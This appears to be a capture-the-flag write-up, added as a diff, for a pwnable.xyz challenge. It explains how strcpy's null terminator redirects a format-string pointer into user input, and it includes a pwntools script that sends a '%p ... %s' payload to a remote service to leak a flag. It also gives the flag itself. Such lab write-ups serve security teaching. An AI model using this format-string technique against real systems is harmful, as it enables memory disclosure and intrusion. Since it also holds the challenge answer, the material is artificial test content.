@@ -1,0 +1,35 @@
+FLAG{should_have_named_it_babyfsb} -- flag
+
+0x601080 -- address of the fake flag
+
+
+--------\using format string attack\-----------
+
+1. first input takes 16 bites and checks if the first character is y of Y.
+   Also it puts input to stack by the address : [rbp-0x20]
+2. second input : allocates 0x84 bites of memory , takes only 0x80 for input. -- can't overflow
+3. strcpy() -- copies input into variable 'usr' , adds 0 at the and if input was 0x80 bites long
+3.a) in setup() function pointer of the format string parameters initialised to 0x601160 address , 
+     so 0x601160 keeps 0x601168 address witch is "% s \ n".
+3.b) The strcpy () function will copy the string and add a null termination at the end, 
+     so usr + 0x80 will be initialized to 0x00. 
+     usr + 0x80 == 0x601160 where the data is the address of the format string into printf ().
+     the value initialized to 0x601168 in the setup () function will be changed to point to address 0x601100 due to the null termination of strcpy (). 
+     This address is usr + 0x20, which we can set arbitrarily through Name input.
+4. we need to read the data at this address : 0x601080
+   gonna do it through format string attack
+   first change the format string parameters through input : "A"*32 + "%lp %lp %lp %lp %lp...(to make input 128 bites)"
+   if we put address of the flag in the stack through first input it gonna pops up in final output
+   change the number of format parameter of the flag address to %s and keep input at 128 bites
+   
+
+
+
+from pwn import *
+p = remote("svc.pwnable.xyz", 30004)
+print(p.readuntil(':')) # Are you 18 year @@@
+p.write('y' * 8 + p64(0x601080))
+formatstr = "%p %p %p %p %p %p %p %p %s"
+print(p.readuntil(':')) # Name:
+p.write('A' * 32 + formatstr + 'A' * (0x80 - 32 - len(formatstr)))
+print(p.readuntil("AAAAA"))
